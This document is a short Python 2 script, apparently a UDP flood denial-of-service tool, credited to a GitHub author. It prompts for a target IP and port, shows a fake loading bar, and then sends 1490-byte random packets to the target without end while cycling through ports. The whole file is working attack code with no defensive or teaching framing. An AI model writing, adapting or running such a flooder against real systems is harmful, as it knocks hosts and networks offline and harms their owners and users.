import sys
import os
import time
import socket
import random
import math 
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("cls")

print ("Author   : AlexandreZT")
print ("github   : https://github.com/AlexandreZT")

ip = raw_input("IP Target : ") # 2.7
port = input("Port       : ")

os.system("cls")

# loadind ~10s
for i in range (1, 101, 1):
  print("["+"="*int(math.ceil(i/5))+"]", "{0}%".format(i,))
  time.sleep(0.1)
  os.system("cls")

time.sleep(2)

sent = 0

print(type(ip)) #str
print(type(port)) #int
time.sleep(5)

while True:
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1